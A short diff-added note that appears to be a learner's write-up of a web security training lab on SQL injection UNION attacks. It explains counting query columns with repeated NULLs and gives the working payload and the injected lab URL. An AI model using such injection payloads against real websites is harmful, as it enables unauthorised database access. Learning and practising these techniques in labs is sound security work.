@@ -1,0 +1,11 @@
+SQL injection UNION attack, determining the number of columns returned by the query
+
+Solution provided works great. We're trying to find out the number of columns by asking for more columns until the server stop erroring out:
+Turns out we have 3 columns since we required 3 NULL's, which you probably could've told by looking at the database results anyway.
+
+Payload:
+'+UNION+SELECT+NULL,NULL,NULL--
+
+URL:
+
+https://accb1f411ebf77708003033800b4001d.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL,NULL--
